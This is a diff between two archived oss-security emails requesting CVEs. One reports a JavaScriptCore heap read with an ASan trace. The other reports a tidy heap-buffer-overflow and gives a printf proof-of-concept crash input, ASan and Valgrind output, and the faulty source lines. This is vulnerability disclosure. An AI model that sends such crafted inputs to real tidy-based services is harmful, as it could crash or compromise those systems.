@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4816" "Thursday" "10" "November" "2016" "15:07:51" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdRbBPaw4MCTH7eskU5r1xfM8WGAaLU--=aNjy6x0B6-QQ@mail.gmail.com>" "108" "[oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with the last revision of JavaScript Core" nil nil nil "11" "2016111018:07:51" "[oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with the last revision of JavaScript Core" (number mark "U       gustavo.grie Nov 10  108/4816  " thread-indent "\"[oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with the last revision of JavaScript Core\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2447" "Thursday" "4" "June" "2015" "00:50:41" "-0500" "=?UTF-8?B?RmVybmFuZG8gTXXDsW96?=" "fernando@null-life.com" "<CAEr-gPENyN7yex+Ra7UWMaLTAzVKA+9+YNX=H7jcY4G6CsfPLQ@mail.gmail.com>" "72" "[oss-security] CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow" nil nil nil "6" "2015060405:50:41" "[oss-security] CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow" (number mark "        fernando@nul Jun  4   72/2447  " thread-indent "\"[oss-security] CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 24275 invoked by uid 550); 10 Nov 2016 18:08:10 -0000
+Received: (qmail 17732 invoked by uid 550); 4 Jun 2015 05:50:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,145 +11,101 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 24242 invoked from network); 10 Nov 2016 18:08:09 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=/1WlD3z7AFAmXRmhOFYBgKY2H1xEvjJ96ktx3LYrpJc=;
-        b=XxBmO4lrfBLyQ/4Y24gZCg76qOxw99y5mGeACYc1TLr4eelsQjPqc1YPD5+ITU/vfQ
-         07rrTfuIMX6UIxdaf8nZXw6KvcKGxaRcGF+cMqIpEZbl7kaP+UW1GEMGUJ5jcQzzzBB4
-         8qpybM45qZR3XDpUnIMmvIckzw0+NA1UFyj1Nbrx2036074y5SxAm+rCumlTg5TjqwKF
-         mZ/03ypC3wWQosS7zrclXl1xvNv9Gavs6fqanY5F5YQiu1ofClA7vX6wy8PdxOScZOCJ
-         8DjLCYRG5AjG5kUMoR5MR15Bj57EWo6eTqWuK6+3vwQzHw90qjP9LOYqArOpAXQd9A9g
-         zx3A==
+Received: (qmail 17714 invoked from network); 4 Jun 2015 05:50:53 -0000
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=/1WlD3z7AFAmXRmhOFYBgKY2H1xEvjJ96ktx3LYrpJc=;
-        b=YJZY3aRrgeB+rWraF41sOag3Uwqyn/FfK91ziBUyMx3fSMaxwOH/J4ELCAFPrEW2w8
-         QJA2e2ox20OU/hDuqvHkK8B3LvqXM1eDRFpyN8G0fNmTa1QF4O5msoXaJsejfJyLrNFI
-         yH40MXgMkGfQt/6Emz3w8aTwU0JSSU5E2NI7VOj15HKI+1BUC5nPP3Gmi+f/rsaqN2kW
-         2YWSQSYgs7FS0nP39tz4pXQqJKso8W1yNPsb3eNnvqYkS7vFUFVJPkuqNyoO/J0E5I84
-         pi6NhQmPL2IDR//WqGosHPnLhcZoq1VdCsDk7Ba7PC6BZFTkSv8hGeOcXrAe0uFJgrv0
-         w8EA==
-X-Gm-Message-State: ABUngvc+3yjKbrAPkgFMybunOVbla0BYcWhML+voEUP6pPhvh3dF+eeq3v4rSdZxDD9E4KL9NmdfJxNHWJi/wQ==
-X-Received: by 10.107.55.136 with SMTP id e130mr7202723ioa.76.1478801272516;
- Thu, 10 Nov 2016 10:07:52 -0800 (PST)
+        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
+         :content-type:content-transfer-encoding;
+        bh=dThoiKfeaQeEgNvgUq0Es+y+rARyIF420xJF4j5xqhM=;
+        b=He3NwdkU52tqJ52D7zCMHYCFFZsw/G+lcJsp7k/2hRPZWrcToFhVT9e96FrEemozD2
+         tYtswvWGPiJ0Oj4kil70sRIXOx75iSP3rA1IhZ0jiJYGLBWz1C0mTO+CuHmuuqq8XvDH
+         6b9CFkbsKLJFZ+ZzzIRYbrV85Dmt/Jo8jt+zGxTy18HgvQSXj92dsEMW6y3Wk21XXixQ
+         3wkzC1YLweNPoI2mLhUsPfpplQQmF+9WGIchA9nmZ9iURM6kUbCWITiEppzwRvgsFZJY
+         8PBKYXIF9e8KM0cJr+/02b0lxEgMtoWHcTZDq9tP3s8Qg1XAfGkLZyV8VtyU34KkQKUN
+         Netg==
+X-Gm-Message-State: ALoCoQkRQvYdRxAMa4tR8/4KVNfUtZaV5ixj27OgcG+xA62gRC01HTKcDhFuqrU1IhTFDaiG4dMW
 MIME-Version: 1.0
-From: Gustavo Grieco <gustavo.grieco@gmail.com>
-Date: Thu, 10 Nov 2016 15:07:51 -0300
-Message-ID: <CACn5sdRbBPaw4MCTH7eskU5r1xfM8WGAaLU--=aNjy6x0B6-QQ@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary=001a114ac2808ab63c0540f64046
-Subject: [oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with
- the last revision of JavaScript Core
-
---001a114ac2808ab63c0540f64046
+X-Received: by 10.43.76.195 with SMTP id zf3mr2449512icb.62.1433397041805;
+ Wed, 03 Jun 2015 22:50:41 -0700 (PDT)
+X-Originating-IP: [181.50.56.230]
+Message-ID: <CAEr-gPENyN7yex+Ra7UWMaLTAzVKA+9+YNX=H7jcY4G6CsfPLQ@mail.gmail.com>
 Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Date: Thu, 4 Jun 2015 00:50:41 -0500
+From: =?UTF-8?Q?Fernando_Mu=C3=B1oz?= <fernando@null-life.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow
+To: oss-security@lists.openwall.com
 
-Hi,
+Hello ,
 
-We recently found a read out-of-bounds parsing JavaScript code in the last
-revision of WebKit (
-https://github.com/WebKit/webkit/commit/fcf81f3ad83cd910727c7a1824e50377a474c8f4).
-I tested this issue in ArchLinux (x86_64) but other configurations could be
-affected. To reproduce:
+I'd like to request a CVE ID for the following issue:
 
-1. Recompile jsc with ASAN support.
-2. Execute:
+tidy [1]  is affected by a write out of bounds when processing
+malformed html files.
+This issue could be abused on server side applications that use
+php-tidy extension with user input.
 
-$ ./jsc red.-4050783292692436029.nkpzevdpie.js
+The issue was confirmed, analysed and fixed by the tidy5 maintainer. [2]
+
+POC
+
+$ printf "\x3c\x61\x20\x62\x3d\x3c\x61\x20\x3c\x3f\x78\x6d
+\x0d\x3f\x3e\x62\x3d\x22\x63\x22\x47\x20\x68\x72\x65
+\x66\x3d\x22\x12\x22\xbb" > err.html
+
+An asan-enabled build of tidy outputs:
+
+$ tidy-asan err.html
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D
+=3D=3D2196=3D=3DERROR: AddressSanitizer: heap-buffer-overflow on address
+0xb53006b1 at pc 0xb71df8fe bp 0xbfac9928 sp 0xbfac9918
+WRITE of size 1 at 0xb53006b1 thread T0
+    #0 0xb71df8fd in prvTidytmbstrndup (/usr/lib/libtidy-0.99.so.0+0x15c8fd)
+    #1 0xb7141060 in prvTidyGetToken (/usr/lib/libtidy-0.99.so.0+0xbe060)
+    #2 0xb711856e in prvTidyParseDocument (/usr/lib/libtidy-0.99.so.0+0x955=
+6e)
+    #3 0xb71f2a58 in prvTidyDocParseStream (/usr/lib/libtidy-0.99.so.0+0x16=
+fa58)
+    #4 0xb71f34a5 in tidyParseFile (/usr/lib/libtidy-0.99.so.0+0x1704a5)
+    #5 0x804bfa9 (/usr/bin/tidy+0x804bfa9)
+    #6 0xb6edf72d in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x187=
+2d)
+    #7 0x804fa4e (/usr/bin/tidy+0x804fa4e)
+
+0xb53006b1 is located 0 bytes to the right of 1-byte region
+[0xb53006b0,0xb53006b1)
+allocated by thread T0 here:
+    #0 0xb72af18c in __interceptor_malloc
+(/usr/lib/i386-linux-gnu/libasan.so.1+0x5118c)
+    #1 0xb71c5963 (/usr/lib/libtidy-0.99.so.0+0x142963)
 ...
-=================================================================
-==24637==ERROR: AddressSanitizer: heap-buffer-overflow on address
-0x603000014fc8 at pc 0x7ffff67f04b0 bp 0x7fffaccf8820 sp 0x7fffaccf8810
-READ of size 16 at 0x603000014fc8 thread T2
-==24637==AddressSanitizer: while reporting a bug found another one.
-Ignoring.
-    #0 0x7ffff67f04af in WTF::(anonymous namespace)::lockHashtable()
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20cc4af)
-    #1 0x7ffff67f1b6c in WTF::ParkingLot::parkConditionallyImpl(void
-const*, WTF::ScopedLambda<bool ()> const&, WTF::ScopedLambda<void ()>
-const&, std::chrono::time_point<std::chrono::_V2::steady_clock,
-std::chrono::duration<long, std::ratio<1l, 1000000000l> > >)
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20cdb6c)
-    #2 0x7ffff67cc1cb in std::_Function_handler<void (),
-WTF::AutomaticThread::start(WTF::Locker<WTF::LockBase>
-const&)::{lambda()#1}>::_M_invoke(std::_Any_data const&)
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20a81cb)
-    #3 0x7ffff67f7da5 in WTF::threadEntryPoint(void*)
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20d3da5)
-    #4 0x7ffff685a530 in WTF::wtfThreadEntryPoint(void*)
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x2136530)
-    #5 0x7ffff1df1453 in start_thread (/usr/lib/libpthread.so.0+0x7453)
-    #6 0x7ffff0c017de in __GI___clone (/usr/lib/libc.so.6+0xe87de)
 
-0x603000014fd0 is located 0 bytes to the right of 32-byte region
-[0x603000014fb0,0x603000014fd0)
-allocated by thread T2 here:
-    #0 0x7ffff6efee60 in __interceptor_malloc
-/build/gcc-multilib/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:62
-    #1 0x7ffff686792f in bmalloc::Allocator::allocateSlowCase(unsigned
-long)
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x214392f)
+Valgrind with the standard build:
 
-Thread T2 created by T0 here:
-    #0 0x7ffff6e69498 in __interceptor_pthread_create
-/build/gcc-multilib/src/gcc/libsanitizer/asan/asan_interceptors.cc:236
-    #1 0x7ffff685b983 in WTF::createThreadInternal(void (*)(void*), void*,
-char const*)
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x2137983)
+$ valgrind tidy err.html
+...
+=3D=3D30499=3D=3D Invalid write of size 1
+=3D=3D30499=3D=3D    at 0x408805C: prvTidytmbstrndup (tmbstr.c:39)
+=3D=3D30499=3D=3D    by 0x40738A8: ParseValue (lexer.c:3486)
+...
 
-SUMMARY: AddressSanitizer: heap-buffer-overflow
-(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20cc4af)
-in WTF::(anonymous namespace)::lockHashtable()
-Shadow bytes around the buggy address:
-  0x0c067fffa9a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffa9b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffa9c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffa9d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffa9e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-=>0x0c067fffa9f0: fa fa fa fa fa fa 00 00 00[00]fa fa fd fd fd fd
-  0x0c067fffaa00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffaa10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffaa20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffaa30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c067fffaa40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07
-  Heap left redzone:       fa
-  Heap right redzone:      fb
-  Freed heap region:       fd
-  Stack left redzone:      f1
-  Stack mid redzone:       f2
-  Stack right redzone:     f3
-  Stack partial redzone:   f4
-  Stack after return:      f5
-  Stack use after scope:   f8
-  Global redzone:          f9
-  Global init order:       f6
-  Poisoned by user:        f7
-  Container overflow:      fc
-  Array cookie:            ac
-  Intra object redzone:    bb
-  ASan internal:           fe
-  Left alloca redzone:     ca
-  Right alloca redzone:    cb
-==24637==ABORTING
+=3D=3D30499=3D=3D Invalid write of size 1
+=3D=3D30499=3D=3D    at 0x4088065: prvTidytmbstrndup (tmbstr.c:41)
+=3D=3D30499=3D=3D    by 0x40738A8: ParseValue (lexer.c:3486)
+=3D=3D30499=3D=3D    by 0x4075F39: ParseAttrs (lexer.c:3603)
+=3D=3D30499=3D=3D    by 0x4075F39: GetTokenFromStream (lexer.c:2416)
 
-I'm forwarding this issue since i receive no answer from the Webkit
-developers in more than 3 weeks. The original bug report (private) is here:
+...
+file: tmbstr.c
 
-https://bugs.webkit.org/show_bug.cgi?id=164000
+39        while ( len-- > 0 &&  (*cp++ =3D *str++) )
+40          /**/;
+41        *cp =3D 0;
 
-The reproducer are available upon request. Please assign a CVE if
-necessary.
+Credit: Fernando Mu=C3=B1oz
 
-This issue was found using QuickFuzz.
-
-Regards,
-Gustavo.
-
---001a114ac2808ab63c0540f64046--
+[1] tidy.sourceforge.net
+[2] https://github.com/htacg/tidy-html5/issues/217
